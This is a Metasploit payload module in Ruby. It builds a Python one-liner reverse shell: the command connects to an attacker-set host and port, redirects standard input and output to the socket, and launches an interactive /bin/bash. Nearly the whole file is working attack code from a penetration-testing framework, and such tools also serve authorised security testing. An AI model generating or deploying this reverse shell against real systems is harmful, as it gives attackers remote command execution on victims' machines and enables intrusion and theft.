##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Unix Command Shell, Reverse TCP (via Python)',
      'Version'     => '$Revision: 0 $',
      'Description' => 'Connect back and create a command shell via Python',
      'Author'      => 'Alex Harvey <alex@pixelfactor.ca>',
      'License'     => MSF_LICENSE,
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'cmd',
      'RequiredCmd' => 'python',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
    register_options([
      OptString.new('SHELL', [true, 'The system shell to use.', '/bin/bash'])
    ], self.class)
  end

  def generate
    return super + command_string
  end

  #
  # Generate command string
  #

  def command_string
	raw_cmd = "import socket,os;s=socket.socket();s.connect((\"#{datastore['LHOST']}\",#{datastore['LPORT']}));h=s.fileno();d=os.dup2;d(h,0);d(h,1);d(h,2);os.execl(\"#{datastore['SHELL']}\",\"-i\")"
    "python -c'#{raw_cmd}'"
  end

end
